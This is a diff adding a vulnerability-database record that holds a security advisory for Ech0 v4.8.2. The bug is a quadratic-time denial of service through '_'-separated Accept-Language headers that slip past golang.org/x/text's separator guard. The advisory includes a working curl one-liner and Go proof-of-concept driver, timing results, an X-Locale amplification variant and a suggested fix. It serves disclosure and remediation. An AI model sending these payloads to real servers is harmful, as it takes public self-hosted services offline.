@@ -1,0 +1,263 @@
+[basic]
+description = '''
+### Summary
+
+Ech0's i18n middleware runs on every HTTP request and constructs a fresh `*goi18n.Localizer` from the raw `Accept-Language` header without imposing any size or shape filter. `goi18n.NewLocalizer` calls `golang.org/x/text/language.ParseAcceptLanguage` on the value internally. The underlying parser has quadratic-time behaviour on long lists of malformed language tags. The CVE-2022-32149 guard that golang.org/x/text added in v0.3.8 caps the number of `-` characters in the input at 1000, but it does not cap `_` characters even though the parser's internal scanner aliases `_` to `-` before parsing. A single unauthenticated GET request with an `Accept-Language` header built out of `_` separators burns about 1.5 seconds of server CPU on the host running Ech0; ten concurrent attackers saturate a ten-core box for the duration of the attack while consuming ~10 MiB/s of upstream bandwidth.
+
+### Affected versions
+
+`github.com/lin-snow/Ech0` v4.8.2 and (per code inspection of `main`) earlier 4.x versions that wire the `internal/i18n.Middleware()` gin middleware on the global router without imposing their own size limit on `Accept-Language`. Verified on:
+
+- the official `ghcr.io/lin-snow/ech0:latest` Docker image at v4.8.2 (E2E below)
+- `main` at commit `451c7c10eb1f23f7525c163e83f8b39f46d5aad0` by reading `internal/i18n/i18n.go` (the middleware and `setLocaleContext` call site are unchanged)
+
+### Privilege required
+
+Unauthenticated. The `i18n.Middleware` runs for every HTTP request including the public landing page, the public comments feed, and the unauthenticated `/api/echo/page` endpoint.
+
+### Vulnerable code
+
+[`internal/i18n/i18n.go`](https://github.com/lin-snow/Ech0/blob/451c7c10eb1f23f7525c163e83f8b39f46d5aad0/internal/i18n/i18n.go) (blob SHA `451c7c10eb1f23f7525c163e83f8b39f46d5aad0`), the gin middleware `Middleware()` at lines 202-213:
+
+```go
+func Middleware() gin.HandlerFunc {
+    return func(ctx *gin.Context) {
+        explicit := explicitLocaleFromRequest(ctx)
+        acceptLanguage := strings.TrimSpace(ctx.GetHeader(\"Accept-Language\"))
+        locale := systemDefaultLocale()
+        if explicit != \"\" {
+            locale = ResolveLocale(explicit, acceptLanguage)
+        }
+        setLocaleContext(ctx, locale, acceptLanguage)
+        ctx.Next()
+    }
+}
+```
+
+`setLocaleContext` at line 191 then calls `NewLocalizer(normalized, acceptLanguage)`:
+
+```go
+func setLocaleContext(ctx *gin.Context, locale, acceptLanguage string) {
+    if ctx == nil {
+        return
+    }
+    normalized := ResolveLocale(locale)
+    localizer := NewLocalizer(normalized, acceptLanguage)
+    ctx.Set(ContextLocaleKey, normalized)
+    ctx.Set(ContextLocalizerKey, localizer)
+    ctx.Header(\"Content-Language\", normalized)
+}
+```
+
+`NewLocalizer` is a thin wrapper around `goi18n.NewLocalizer`, which internally calls `language.ParseAcceptLanguage(lang)` for every passed string in its `parseTags` helper (see `github.com/nicksnyder/go-i18n/v2@v2.6.0/i18n/localizer.go:42-50`). So the unfiltered `acceptLanguage` reaches `language.ParseAcceptLanguage` on every request.
+
+`ctx.GetHeader(\"Accept-Language\")` is the unfiltered HTTP header. Go's default `net/http` `MaxHeaderBytes` is `1 << 20` = 1 MiB and Ech0 does not override it, so the parser is allowed to receive up to a megabyte of attacker-controlled data.
+
+The additional `ResolveLocale` path at line 208 also calls `language.ParseAcceptLanguage(strings.Join(parts, \",\"))` directly when `X-Locale` or the `lang` query parameter is set, with the same vector and a longer-running effect (the input concatenates `explicit + acceptLanguage` so the parser sees both, and the path is exercised twice).
+
+CVE-2022-32149 hardened `ParseAcceptLanguage` by counting `-` characters and rejecting inputs with more than 1000 of them. The guard does not count `_` characters even though the scanner converts `_` to `-` at parse time ([`golang.org/x/text/internal/language/parse.go`](https://github.com/golang/text/blob/v0.28.0/internal/language/parse.go)). A 1 MiB header full of 9-character `_abcdefghi` tokens contains zero `-` characters, passes the guard, and then drives the scanner into the O(N²) `gobble` path.
+
+### How `Accept-Language` reaches `ParseAcceptLanguage`
+
+The middleware sequence on any HTTP request:
+
+1. The request enters `i18n.Middleware()`.
+2. `ctx.GetHeader(\"Accept-Language\")` returns the full attacker-supplied header value.
+3. `setLocaleContext` is called with that value.
+4. `NewLocalizer(normalized, acceptLanguage)` constructs a goi18n localizer; goi18n's `parseTags` calls `language.ParseAcceptLanguage(acceptLanguage)` unfiltered.
+
+No size or character-class filter is applied between (2) and (4). When `X-Locale` or `?lang=` is also present, the parser is invoked twice on related input via the explicit `ResolveLocale(explicit, acceptLanguage)` path at line 210.
+
+### Proof of concept
+
+Single-line bash reproducer that crafts the malicious header and times one request against a fresh `ghcr.io/lin-snow/ech0:latest` container:
+
+```bash
+docker run -d --name ech0 --rm -p 18300:6277 ghcr.io/lin-snow/ech0:latest
+sleep 5
+
+PAYLOAD=\"en$(python3 -c 'print(\"_abcdefghi\" * 100000, end=\"\")')\"
+echo \"header size = ${#PAYLOAD} bytes\"
+
+curl -sS -o /dev/null \
+  -w 'http=%{http_code} t=%{time_total}\n' \
+  -H \"Accept-Language: ${PAYLOAD}\" \
+  http://127.0.0.1:18300/
+```
+
+Each 9-character `_abcdefghi` token has length 9, which fails the scanner's `len <= 8` tag-length check at `golang.org/x/text/internal/language/parse.go` and triggers a `gobble` call that `runtime.memmove`s the entire remaining buffer. With N invalid tokens the total bytes moved by `gobble` is O(N²).
+
+### End-to-end reproduction (against `ghcr.io/lin-snow/ech0:latest` at v4.8.2)
+
+A Go driver `poc.go` boots the container, sends a 1 MiB `Accept-Language` value once with `-` (CVE-2022-32149 guard fires) and once with `_` (guard bypassed):
+
+```go
+// poc.go
+package main
+
+import (
+    \"fmt\"
+    \"io\"
+    \"net\"
+    \"net/http\"
+    \"strings\"
+    \"time\"
+)
+
+const targetURL = \"http://127.0.0.1:18300/\"
+
+func buildPayload(sep string, targetBytes int) string {
+    const tok = \"abcdefghi\"
+    var b strings.Builder
+    b.Grow(targetBytes + 16)
+    b.WriteString(\"en\")
+    for b.Len()+1+len(tok) <= targetBytes {
+        b.WriteString(sep)
+        b.WriteString(tok)
+    }
+    return b.String()
+}
+
+func send(label, header string) {
+    client := &http.Client{
+        Timeout: 60 * time.Second,
+        Transport: &http.Transport{
+            DisableKeepAlives: true,
+            DialContext: (&net.Dialer{Timeout: 5 * time.Second}).DialContext,
+        },
+    }
+    req, _ := http.NewRequest(\"GET\", targetURL, nil)
+    if header != \"\" {
+        req.Header.Set(\"Accept-Language\", header)
+    }
+    t0 := time.Now()
+    resp, err := client.Do(req)
+    dt := time.Since(t0)
+    if err != nil {
+        fmt.Printf(\"  %-32s ERR after %v: %v\n\", label, dt, err)
+        return
+    }
+    _, _ = io.Copy(io.Discard, resp.Body)
+    resp.Body.Close()
+    fmt.Printf(\"  %-32s header=%d B  '_'=%d  '-'=%d  status=%d  t=%v\n\",
+        label, len(header),
+        strings.Count(header, \"_\"), strings.Count(header, \"-\"),
+        resp.StatusCode, dt)
+}
+
+func main() {
+    send(\"warm-up\", \"\")
+    send(\"baseline (no header)\", \"\")
+    send(\"baseline (1 short tag)\", \"en-US\")
+    send(\"guard-fires ('-' x 1MiB)\", buildPayload(\"-\", 1<<20))
+    send(\"attack ('_' x 1MiB)\",     buildPayload(\"_\", 1<<20))
+    send(\"attack repeat 2\",          buildPayload(\"_\", 1<<20))
+    send(\"attack repeat 3\",          buildPayload(\"_\", 1<<20))
+}
+```
+
+Captured run output (Apple M1 Pro, darwin/arm64, Go 1.26.1, the official `ghcr.io/lin-snow/ech0:latest` image at v4.8.2):
+
+```
+E2E: golang/x/text ParseAcceptLanguage '_' bypass through
+lin-snow/Ech0 v4.8.2 i18n middleware at
+internal/i18n/i18n.go (Middleware -> setLocaleContext -> NewLocalizer).
+
+Target: http://127.0.0.1:18300/   payload=1048576 B
+
+  warm-up                                      header=0 B  '_'=0  '-'=0  status=200  t=7.692458ms
+
+--- measurements (single request each) ---
+  baseline (no header)                         header=0 B  '_'=0  '-'=0  status=200  t=2.666625ms
+  baseline (1 short tag)                       header=5 B  '_'=0  '-'=1  status=200  t=1.981333ms
+  guard-fires control ('-' x payload)          header=1048572 B  '_'=0  '-'=104857  status=200  t=21.445083ms
+  attack ('_' x payload)                       header=1048572 B  '_'=104857  '-'=0  status=200  t=1.489513083s
+  attack repeat 2                              header=1048572 B  '_'=104857  '-'=0  status=200  t=1.501842542s
+  attack repeat 3                              header=1048572 B  '_'=104857  '-'=0  status=200  t=1.571093458s
+```
+
+Setting `X-Locale: en` in addition (which triggers the explicit-locale `ResolveLocale` path at line 210, calling `ParseAcceptLanguage(strings.Join(parts, \",\"))` directly) makes the same request take ~7.9 s on the same host — the attacker doubles the work by adding one short header. Setting `?lang=en` in the query gives ~3 s.
+
+Interpretation:
+
+| Request                                  | Header bytes | Server time |
+|------------------------------------------|--------------|-------------|
+| no header / short tag                    | 0 - 5        | 2 - 8 ms    |
+| 1 MiB `-` separators (CVE-2022-32149 guard fires) | 1 MiB | 21 ms       |
+| 1 MiB `_` separators (guard bypassed), no X-Locale | 1 MiB | 1.5 - 1.6 s |
+| 1 MiB `_` separators with X-Locale: en   | 1 MiB        | ~7.9 s      |
+
+The `-` control proves that the existing CVE-2022-32149 guard does still work on the canonical separator. The `_` attack returns 200 from the same endpoint but consumes ~1.5 s of server CPU on the default path and ~7.9 s when the attacker adds a one-byte `X-Locale: en` header. The amplification factor at the application boundary is ~70x in the default case (21 ms guard-fires vs 1.5 s attack on the same 1 MiB header) and ~370x in the X-Locale variant.
+
+### Impact
+
+- One unauthenticated client can pin one CPU core for ~1.5 seconds per 1 MiB request, or ~7.9 seconds if the attacker adds the `X-Locale: en` header.
+- Ten concurrent attackers using ~10 MiB/s of upstream bandwidth pin a 10-core Ech0 instance indefinitely.
+- The endpoint returns 200 OK, so the attack does not surface as abnormal traffic in standard 4xx/5xx dashboards.
+- Self-hosted Ech0 instances published to the public internet (the documented use case) are exposed.
+
+### Suggested fix
+
+Apply the size / character-class filter at the i18n middleware boundary, before the `Accept-Language` value reaches `setLocaleContext` (and through it `NewLocalizer`). The smallest change that preserves the existing behaviour for legitimate Accept-Language headers is to count `_` alongside `-` and drop the header when the total exceeds a small ceiling:
+
+```go
+// internal/i18n/i18n.go
+const maxAcceptLanguageSeparators = 32 // real browsers send < 10
+
+func sanitizeAcceptLanguage(v string) string {
+    if strings.Count(v, \"-\")+strings.Count(v, \"_\") > maxAcceptLanguageSeparators {
+        return \"\"
+    }
+    return v
+}
+
+func Middleware() gin.HandlerFunc {
+    return func(ctx *gin.Context) {
+        explicit := explicitLocaleFromRequest(ctx)
+        acceptLanguage := sanitizeAcceptLanguage(strings.TrimSpace(ctx.GetHeader(\"Accept-Language\")))
+        locale := systemDefaultLocale()
+        if explicit != \"\" {
+            locale = ResolveLocale(explicit, acceptLanguage)
+        }
+        setLocaleContext(ctx, locale, acceptLanguage)
+        ctx.Next()
+    }
+}
+```
+
+The same `sanitizeAcceptLanguage` should be applied wherever `Accept-Language` is consumed (`HeaderLocale` at line 230 and the `user.go` paths at lines 80, 275 that pass user input into `ResolveLocale`).
+
+A real Accept-Language header from a browser contains under 10 separators, so a ceiling of 32 leaves plenty of headroom while making the quadratic blow-up impossible.
+
+The underlying issue is in `golang.org/x/text/language`. A future upstream fix is the right long-term solution; the change above is defensive-in-depth at the middleware that consumes attacker input.
+
+### Credit
+
+Reported by tonghuaroot.
+
+### Fix PR
+
+https://github.com/lin-snow/Ech0-ghsa-mqxv-9rm6-w8qc/pull/1
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Ech0: ParseAcceptLanguage `_` separator bypass enables ~70x CPU amplification via Accept-Language header in i18n.Middleware"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-mqxv-9rm6-w8qc"]
+ave_id = "AVE-2026-1154"
+
+[meta]
+collected_at = "2026-08-06T08:01:25.810814631+00:00"
+status = "completed"
+
+[references]
+urls = []
